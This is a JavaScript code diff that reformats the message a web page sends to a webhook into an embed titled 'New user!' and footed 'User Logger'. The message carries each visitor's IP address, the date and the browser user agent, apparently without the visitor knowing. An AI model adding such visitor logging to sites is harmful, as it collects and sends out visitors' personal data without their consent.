@@ -18,8 +18,34 @@
                 const userIP = ipData.ip;
 
                 const payload = {
-                    content: `New user! \n**IP:** ${userIP} \n**Data:** ${new Date().toLocaleString()} \n**WebBrowser:** ${navigator.userAgent}`
-                };
+    embeds: [
+        {
+            title: "New user!",
+            color: 0x3498db,
+            fields: [
+                {
+                    name: "IP",
+                    value: userIP,
+                    inline: false
+                },
+                {
+                    name: "Data",
+                    value: new Date().toLocaleString(),
+                    inline: false
+                },
+                {
+                    name: "WebBrowser",
+                    value: navigator.userAgent,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "User Logger"
+            },
+            timestamp: new Date().toISOString()
+        }
+    ]
+};
 
                 await fetch(WAMDD, {
                     method: 'POST',
